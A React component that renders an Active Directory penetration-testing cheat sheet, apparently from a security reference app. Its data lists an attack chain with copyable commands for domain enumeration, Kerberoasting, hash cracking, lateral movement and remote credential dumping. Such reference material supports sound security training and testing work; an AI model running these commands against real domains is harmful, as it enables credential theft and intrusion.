import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaServer, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const ActiveDirectory = () => {
  const [expandedSection, setExpandedSection] = useState('enum');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: 'Guided AD Attack Chain Walkthrough',
      content: [
        {
          type: 'markdown',
          value: 'Follow this step-by-step chain for a typical Active Directory attack. Expand each step for details and commands.'
        },
        {
          type: 'step',
          title: '1. Enumeration',
          description: 'Enumerate users, groups, and computers in the domain.',
          commands: [
            { value: 'enum4linux -a <target>', description: 'Comprehensive AD enumeration' },
            { value: 'ldapsearch -x -H ldap://<target> -s base', description: 'LDAP enumeration' },
            { value: 'SharpHound.exe -c All', description: 'BloodHound collection (full AD recon)' }
          ]
        },
        {
          type: 'step',
          title: '2. Kerberoasting & AS-REP Roasting',
          description: 'Extract service account hashes for offline cracking.',
          commands: [
            { value: 'Rubeus kerberoast', description: 'Kerberoasting with Rubeus' },
            { value: 'Get-DomainUser -PreauthNotRequired', description: 'AS-REP Roasting (PowerView)' }
          ]
        },
        {
          type: 'step',
          title: '3. Crack Hashes',
          description: 'Crack Kerberos hashes to obtain cleartext credentials.',
          commands: [
            { value: 'hashcat -m 13100 hash.txt wordlist.txt', description: 'Crack Kerberos hashes with hashcat' }
          ]
        },
        {
          type: 'step',
          title: '4. Lateral Movement & Privilege Escalation',
          description: 'Use credentials for lateral movement and privilege escalation.',
          commands: [
            { value: 'psexec.py <user>:<pass>@<target>', description: 'Lateral movement with psexec' },
            { value: 'secretsdump.py <user>:<pass>@<target>', description: 'Dump hashes from remote system' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** After each step, check for new credentials and document your findings!'
        }
      ]
    },
    {
      id: 'enum',
      title: 'Enumeration',
      content: [
        {
          type: 'markdown',
          value: `### Tools & Commands
\`\`\`bash
# enum4linux
enum4linux -a 10.10.10.1

# LDAP Enumeration
ldapsearch -x -H ldap://10.10.10.1 -s base

# BloodHound Collection
SharpHound.exe -c All
\`\`\``
        }
      ]
    },
    {
      id: 'attacks',
      title: 'Common Attacks',
      content: [
        {
          type: 'markdown',
          value: `### Techniques
- **Kerberoasting**: Extract TGS tickets with \`Rubeus\`
- **AS-REP Roasting**: For users without preauth
- **Pass-the-Hash**: Using NTLM hashes for lateral movement`
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaServer /> Active Directory Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Enumeration and exploitation guide for Active Directory environments.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'step') {
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header">
                            <strong>{item.title}</strong>
                          </div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button
                                    onClick={() => handleCopy(cmd.value)}
                                    className="copy-button small"
                                  >
                                    Copy
                                  </button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>{item.value}</ReactMarkdown>
                          </div>
                        </div>
                      );
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default ActiveDirectory;